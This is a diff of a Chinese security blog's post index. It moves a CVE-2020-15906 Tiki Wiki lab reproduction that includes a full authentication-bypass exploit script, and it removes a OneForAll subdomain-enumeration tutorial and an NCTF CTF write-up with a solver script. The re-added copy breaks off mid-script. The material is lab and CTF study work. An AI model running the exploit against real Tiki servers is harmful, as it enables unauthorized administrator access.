@@ -58,163 +58,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2020-15906</title>
-    <url>/post/56b8d0cc.html</url>
-    <content><![CDATA[<h1 id="tikiwiki"><a href="#tikiwiki" class="headerlink" title="tikiwiki"></a>tikiwiki</h1><h2 id="CVE-2020-15906"><a href="#CVE-2020-15906" class="headerlink" title="CVE-2020-15906"></a>CVE-2020-15906</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Tiki Wiki CMS Groupware 或简称为Tiki（最初称为TikiWiki）是一种免费且开源的基于Wiki的内容管理系统和在线办公套件。</p>
-<p>在如下这些版本21.2, 20.4, 19.3, 18.7, 17.3, 16.4前存在一处逻辑错误，管理员账户被爆破60次以上时将被锁定，此时使用空白密码即可以管理员身份登录后台。</p>
-<h3 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h3><blockquote>
-<p>Tiki Tiki  &lt; 21.2</p>
-</blockquote>
-<h3 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h3><blockquote>
-<p>vulhub&#x2F;tikiwiki&#x2F;CVE-2020-15906</p>
-<p>kali</p>
-</blockquote>
-<p><strong>利用 poc</strong></p>
-<blockquote>
-<p><a href="https://srcincite.io/pocs/cve-2021-26119.py.txt">https://srcincite.io/pocs/cve-2021-26119.py.txt</a></p>
-</blockquote>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入目录</span></span><br><span class="line"><span class="built_in">cd</span> /root/vulhub/tikiwiki/CVE-2020-15906</span><br><span class="line"><span class="comment"># 对靶场进行编译</span></span><br><span class="line">docker-compose build</span><br><span class="line"><span class="comment"># 运行靶场</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="comment"># 查看运行的端口</span></span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
-
-<p>访问你的 ip:8080 ,进入首页</p>
-<p><img src="/../image/CVE-2020-15906/1.png" alt="1"></p>
-<p>访问 <code>changelog.txt</code>获得 tiki 版本为 <code>21.0</code></p>
-<p><img src="/../image/CVE-2020-15906/2.png" alt="2"></p>
-<p>用 <code>searchsploit</code>搜索相关信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Tiki Wiki 21</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/CVE-2020-15906/3.png" alt="3"></p>
-<p>将 poc 复制到本地</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m 48927.py</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/CVE-2020-15906/4.png" alt="4"></p>
-<p>48927.py</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Tiki Wiki CMS Groupware 21.1 - Authentication Bypass</span></span><br><span class="line"><span class="comment"># Date: 01.08.2020 (1st August 2020)</span></span><br><span class="line"><span class="comment"># Exploit Author: Maximilian Barz aka. Silky</span></span><br><span class="line"><span class="comment"># Vendor Homepage: tiki.org</span></span><br><span class="line"><span class="comment"># Software Link: https://jztkft.dl.sourceforge.net/project/tikiwiki/Tiki_21.x_UY_Scuti/21.1/tiki-21.1.zip</span></span><br><span class="line"><span class="comment"># Version: 21.1</span></span><br><span class="line"><span class="comment"># Tested on: Kali Linux 5.7.0-kali1-amd64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> lxml.html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">████████ ██ ██   ██ ██ ██     ██ ██ ██   ██ ██     ██████   ██    ██ </span></span><br><span class="line"><span class="string">   ██    ██ ██  ██  ██ ██     ██ ██ ██  ██  ██          ██ ███   ███ </span></span><br><span class="line"><span class="string">   ██    ██ █████   ██ ██  █  ██ ██ █████   ██      █████   ██    ██ </span></span><br><span class="line"><span class="string">   ██    ██ ██  ██  ██ ██ ███ ██ ██ ██  ██  ██     ██       ██    ██ </span></span><br><span class="line"><span class="string">   ██    ██ ██   ██ ██  ███ ███  ██ ██   ██ ██     ███████  ██ ██ ██ </span></span><br><span class="line"><span class="string">                                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> █████  ██    ██ ████████ ██   ██ ███████ ███    ██ ████████ ██  ██████  █████  ████████ ██  ██████  ███    ██         ██████  ██    ██ ██████   █████  ███████ ███████ </span></span><br><span class="line"><span class="string">██   ██ ██    ██    ██    ██   ██ ██      ████   ██    ██    ██ ██      ██   ██    ██    ██ ██    ██ ████   ██         ██   ██  ██  ██  ██   ██ ██   ██ ██      ██      </span></span><br><span class="line"><span class="string">███████ ██    ██    ██    ███████ █████   ██ ██  ██    ██    ██ ██      ███████    ██    ██ ██    ██ ██ ██  ██         ██████    ████   ██████  ███████ ███████ ███████ </span></span><br><span class="line"><span class="string">██   ██ ██    ██    ██    ██   ██ ██      ██  ██ ██    ██    ██ ██      ██   ██    ██    ██ ██    ██ ██  ██ ██         ██   ██    ██    ██      ██   ██      ██      ██ </span></span><br><span class="line"><span class="string">██   ██  ██████     ██    ██   ██ ███████ ██   ████    ██    ██  ██████ ██   ██    ██    ██  ██████  ██   ████         ██████     ██    ██      ██   ██ ███████ ███████ </span></span><br><span class="line"><span class="string">                                                                                                                                                                        </span></span><br><span class="line"><span class="string">Poof of Concept for CVE-2020-15906 by Maximilian Barz, Twitter: S1lky_1337</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(banner)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: %s &lt;host&gt; &quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Eg:    %s 1.2.3.4 &quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rhost = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#url = &quot;http://&quot;+rhost+&quot;/tiki/tiki-login.php&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span>+rhost+<span class="string">&quot;/tiki-login_scr.php&quot;</span></span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ticket</span>():</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        login_page = r.text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        html = lxml.html.fromstring(login_page)</span><br><span class="line">        auth = html.xpath(<span class="string">&#x27;//input[@name=&quot;ticket&quot;]/@value&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(auth)[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_cookie</span>():</span><br><span class="line">        session.get(url)</span><br><span class="line">        <span class="keyword">return</span> session.cookies.get_dict()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cookie = get_cookie()</span><br><span class="line">    ticket = get_ticket()</span><br><span class="line"></span><br><span class="line">    payload = &#123;<span class="string">&#x27;ticket&#x27;</span>: ticket,<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;login&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;stay_in_ssl_mode_present&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;stay_in_ssl_mode&#x27;</span>:<span class="string">&#x27;n&#x27;</span>&#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: rhost,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzrhost, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://&quot;+rhost+&quot;/tiki-login_scr.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;125&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">        r = session.post(url, payload, headers)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;Account requires administrator approval.&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Admin Password got removed.&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Use BurpSuite to login into admin without a password &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__ == <span class="string">&#x27;__main__&#x27;</span>):</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>对这个脚本我们要进行一些修改，将 45 修改为 46 行样子，73 行同理</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 </span><br></pre></td></tr></table></figure>
-
-
-
-<p>利用 github 上的脚本 ， 地址是 <code>https://srcincite.io/pocs/cve-2021-26119.py.txt</code></p>
-<p>该 POC 先使用 CVE-2020-15906 绕过认证，获取管理员权限；再使用 Smarty 的沙盒绕过漏洞（CVE-2021-26119）于后台执行任意命令</p>
-<p><img src="/../image/CVE-2020-15906/6.png" alt="6"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>OneForAll 使用教程</title>
-    <url>/post/61f481ec.html</url>
-    <content><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>OneForAll 是一款集百家之长，收集能力强大、支持子域爆破、验证、爬取、置换、接管、处理功能强大、速度极快、体验良好的子域收集工具。</p>
-<blockquote>
-<ul>
-<li>收集能力强大，利用证书透明度收集子域、常规检查收集子域、利用网上爬虫档案收集子域、利用DNS数据集收集子域、利用DNS查询收集子域、利用威胁情报平台数据收集子域、利用搜索引擎发现子域，在搜索模块中除特殊搜索引擎，通用的搜索引擎都支持自动排除搜索，全量搜索，递归搜索。</li>
-<li>支持子域爆破，该模块有常规的字典爆破，也有自定义的fuzz模式，支持批量爆破和递归爆破，自动判断泛解析并处理。</li>
-<li>支持子域验证，默认开启子域验证，自动解析子域 DNS，自动请求子域获取 title 和 banner，并综合判断子域存活情况。</li>
-<li>支持子域爬取，根据已有的子域，请求子域响应体以及响应体里的JS，从中再次发现新的子域。</li>
-<li>支持子域置换，根据已有的子域，使用子域替换技术再次发现新的子域。</li>
-<li>支持子域接管，默认开启子域接管风险检查，支持子域自动接管（目前只有 Github，有待完善），支持批量检查。</li>
-<li>处理功能强大，发现的子域结果支持自动去除，自动 DNS 解析，HTTP 请求探测，自动筛选出有效子域，拓展子域的Banner信息，最终支持的导出格式有 txt, csv, json。</li>
-<li>体验良好，各模块都有进度条，异步保存各模块结果。</li>
-</ul>
-</blockquote>
-<p>OneForAll 是基于 CPython 开发的，所以需要 Python3 环境才能运行</p>
-<p>项目地址：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/shmilylty/OneForAll.git</span><br></pre></td></tr></table></figure>
-
-<p>git 安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/shmilylty/OneForAll.git &amp;&amp; cd OneForAll/</span><br></pre></td></tr></table></figure>
-
-<p>安装依赖</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x02-语法"><a href="#0x02-语法" class="headerlink" title="0x02 语法"></a>0x02 语法</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oneforall.py [选项] run</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th align="left">选项</th>
-<th align="left">注释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">–target</td>
-<td align="left">目标URL</td>
-</tr>
-<tr>
-<td align="left">–brute&#x3D;</td>
-<td align="left">使用爆破模块，默认 False</td>
-</tr>
-<tr>
-<td align="left">–dns&#x3D;</td>
-<td align="left">DNS解析子域，默认 True</td>
-</tr>
-<tr>
-<td align="left">–req&#x3D;</td>
-<td align="left">HTTP请求子域，默认 True</td>
-</tr>
-<tr>
-<td align="left">–port&#x3D;</td>
-<td align="left">请求验证子域的端口范围，默认 80 端口</td>
-</tr>
-<tr>
-<td align="left">–valid&#x3D;</td>
-<td align="left">只导出存活的子域结果，默认 False</td>
-</tr>
-<tr>
-<td align="left">–format&#x3D;</td>
-<td align="left">结果保存格式，默认 csv</td>
-</tr>
-<tr>
-<td align="left">–path&#x3D;</td>
-<td align="left">结果保存路径</td>
-</tr>
-<tr>
-<td align="left">–takeover&#x3D;</td>
-<td align="left">检查子域接管，默认 False</td>
-</tr>
-</tbody></table>
-<h1 id="0x03-使用"><a href="#0x03-使用" class="headerlink" title="0x03 使用"></a>0x03 使用</h1><p>扫描单个域名</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 oneforall.py --target example.com run</span><br></pre></td></tr></table></figure>
-
-<p>扫描多域，先把域名放在 url.txt 中</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 oneforall.py --targets url.txt run</span><br></pre></td></tr></table></figure>
-
-<p>结果会保存在 <code>results/</code> 目录下，在运行结果中我们可以看到有 URL、子域名、IP等信息</p>
-<p>其中运行结果中 ip 是一行多个、还有重复的，我们需要提取ip转换成每行一个 ip 且没有重复的 txt 文本中，方便其他工具扫描</p>
-<p>脚本：删除重复 IP</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># conding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把同一行的ip换行,然后写进result.txt的文件里</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> readlist:</span><br><span class="line">    <span class="keyword">for</span> dirs <span class="keyword">in</span> readlist.readlines():</span><br><span class="line">         <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> writelist:</span><br><span class="line">             b = dirs.replace(<span class="string">&quot;,&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">             writelist.write(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除重复ip，然后把结果写进only.txt文件里</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> readlist:</span><br><span class="line">    lines_seen = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> readlist.readlines():</span><br><span class="line">        <span class="keyword">if</span> line <span class="keyword">not</span> <span class="keyword">in</span> lines_seen:</span><br><span class="line">            lines_seen.add(line)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;only.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> writelist:</span><br><span class="line">                writelist.write(line)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>tool</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[NCTF 2018]小绿草之最强大脑</title>
-    <url>/post/f65bc688.html</url>
-    <content><![CDATA[<p>[NCTF 2018]小绿草之最强大脑</p>
-<span id="more"></span>
-
-<p>进去是一个计算的东西。这个自己算肯定不行的</p>
-<p><img src="/../image/03-08-01/1.png" alt="1"><br>查看下源码代，发现有源码泄露，访问 index.php.bak 下载了一个文件，打开是 php 代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;ans&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ans&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>((<span class="variable">$_SESSION</span>[<span class="string">&#x27;ans&#x27;</span>])+<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>])!=<span class="variable">$_POST</span>[<span class="string">&#x27;ans&#x27;</span>])&#123;</span><br><span class="line">		<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">		&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">		alert(&quot;怎么没算对呢？&quot;);  </span></span><br><span class="line"><span class="string">		window.history.back(-1);  &lt;/script&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">time</span>())-<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]&lt;<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">			&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">			alert(&quot;你手速太快啦，服务器承受不住!!!&quot;);  </span></span><br><span class="line"><span class="string">			window.history.back(-1); &lt;/script&gt; &#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">time</span>())-<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]&gt;<span class="number">2</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">			&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">			alert(&quot;你算的太慢了少年！&quot;);  </span></span><br><span class="line"><span class="string">			window.history.back(-1); &lt;/script&gt; &#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">		&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">		alert(&quot;tql，算对了！！&quot;);  </span></span><br><span class="line"><span class="string">	     &lt;/script&gt; &#x27;</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>]++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里使用了 intval 函数，这个函数会获取变量的整数值，根据<a href="https://www.runoob.com/php/php-intval-function.html">描述</a>，64 位系统上，最大带符号的 integer 值是 9223372036854775807</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;420000000000000000000&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出结果为 9223372036854775807</span></span><br></pre></td></tr></table></figure>
-<p>且上面的数刚好满足 21 位<br>php 源码在 if 函数中要求回答时间在 1~2s 之间，这显然不是人力所能达到的，所以我们需要利用到 python 来编写脚本回答问题<br>python 脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s = requests.Session()  <span class="comment"># 因为要连续计算，用来保存当前会话的持续有效性</span></span><br><span class="line">url = <span class="string">&quot;http://1.14.71.254:28978/&quot;</span> <span class="comment">#这里修改为你的题目网址</span></span><br><span class="line">number =<span class="string">&quot;4200000000000000000000&quot;</span>  <span class="comment">#输入的数字</span></span><br><span class="line">proxies = &#123; <span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">r = s.get(url,proxies=proxies)</span><br><span class="line">math = <span class="string">&#x27;&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># response = requests.get(url, headers=headers,proxies=proxies)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    num_pattern =re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;div style=&quot;display:inline;&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>)</span><br><span class="line">    num = num_pattern.findall(r.text)   <span class="comment">#正则提取公式</span></span><br><span class="line">    gg = <span class="string">&quot;9223372036854775807&quot;</span>+<span class="string">&#x27;+&#x27;</span>+math.join(num)[<span class="number">0</span>:-<span class="number">1</span>]  <span class="comment">#拼接真实的公式</span></span><br><span class="line">    <span class="built_in">print</span>(gg)</span><br><span class="line">    ans = <span class="built_in">eval</span>(gg)   <span class="comment">#利用eval直接来计算结果</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    data = <span class="string">&quot;input=&#123;number&#125;&amp;ans=&#123;ans&#125;%&quot;</span>.<span class="built_in">format</span>(number=number,ans=ans)</span><br><span class="line"></span><br><span class="line">    r =s.post(url,headers=headers,data=data,proxies=proxies)</span><br><span class="line">    time.sleep(<span class="number">1.5</span>)   <span class="comment">#延时1.5秒</span></span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/../image/03-08-01/run_result.png" alt="run_result"></p>
-<p>得到 flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSCTF&#123;Y0u_ar3_th3_sTr0ng3st_br41n&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>源码泄露</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>NSSCTF-php代码审计</title>
     <url>/post/646af47d.html</url>
     <content><![CDATA[<p>NSSCTF 上写的几道代码审计题目</p>
@@ -433,6 +276,163 @@
       </tags>
   </entry>
   <entry>
+    <title>CVE-2020-15906</title>
+    <url>/post/56b8d0cc.html</url>
+    <content><![CDATA[<h1 id="tikiwiki"><a href="#tikiwiki" class="headerlink" title="tikiwiki"></a>tikiwiki</h1><h2 id="CVE-2020-15906"><a href="#CVE-2020-15906" class="headerlink" title="CVE-2020-15906"></a>CVE-2020-15906</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Tiki Wiki CMS Groupware 或简称为Tiki（最初称为TikiWiki）是一种免费且开源的基于Wiki的内容管理系统和在线办公套件。</p>
+<p>在如下这些版本21.2, 20.4, 19.3, 18.7, 17.3, 16.4前存在一处逻辑错误，管理员账户被爆破60次以上时将被锁定，此时使用空白密码即可以管理员身份登录后台。</p>
+<h3 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h3><blockquote>
+<p>Tiki Tiki  &lt; 21.2</p>
+</blockquote>
+<h3 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h3><blockquote>
+<p>vulhub&#x2F;tikiwiki&#x2F;CVE-2020-15906</p>
+<p>kali</p>
+</blockquote>
+<p><strong>利用 poc</strong></p>
+<blockquote>
+<p><a href="https://srcincite.io/pocs/cve-2021-26119.py.txt">https://srcincite.io/pocs/cve-2021-26119.py.txt</a></p>
+</blockquote>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入目录</span></span><br><span class="line"><span class="built_in">cd</span> /root/vulhub/tikiwiki/CVE-2020-15906</span><br><span class="line"><span class="comment"># 对靶场进行编译</span></span><br><span class="line">docker-compose build</span><br><span class="line"><span class="comment"># 运行靶场</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="comment"># 查看运行的端口</span></span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
+
+<p>访问你的 ip:8080 ,进入首页</p>
+<p><img src="/../image/CVE-2020-15906/1.png" alt="1"></p>
+<p>访问 <code>changelog.txt</code>获得 tiki 版本为 <code>21.0</code></p>
+<p><img src="/../image/CVE-2020-15906/2.png" alt="2"></p>
+<p>用 <code>searchsploit</code>搜索相关信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Tiki Wiki 21</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/CVE-2020-15906/3.png" alt="3"></p>
+<p>将 poc 复制到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m 48927.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/CVE-2020-15906/4.png" alt="4"></p>
+<p>48927.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Tiki Wiki CMS Groupware 21.1 - Authentication Bypass</span></span><br><span class="line"><span class="comment"># Date: 01.08.2020 (1st August 2020)</span></span><br><span class="line"><span class="comment"># Exploit Author: Maximilian Barz aka. Silky</span></span><br><span class="line"><span class="comment"># Vendor Homepage: tiki.org</span></span><br><span class="line"><span class="comment"># Software Link: https://jztkft.dl.sourceforge.net/project/tikiwiki/Tiki_21.x_UY_Scuti/21.1/tiki-21.1.zip</span></span><br><span class="line"><span class="comment"># Version: 21.1</span></span><br><span class="line"><span class="comment"># Tested on: Kali Linux 5.7.0-kali1-amd64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> lxml.html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">████████ ██ ██   ██ ██ ██     ██ ██ ██   ██ ██     ██████   ██    ██ </span></span><br><span class="line"><span class="string">   ██    ██ ██  ██  ██ ██     ██ ██ ██  ██  ██          ██ ███   ███ </span></span><br><span class="line"><span class="string">   ██    ██ █████   ██ ██  █  ██ ██ █████   ██      █████   ██    ██ </span></span><br><span class="line"><span class="string">   ██    ██ ██  ██  ██ ██ ███ ██ ██ ██  ██  ██     ██       ██    ██ </span></span><br><span class="line"><span class="string">   ██    ██ ██   ██ ██  ███ ███  ██ ██   ██ ██     ███████  ██ ██ ██ </span></span><br><span class="line"><span class="string">                                                                     </span></span><br><span class="line"><span 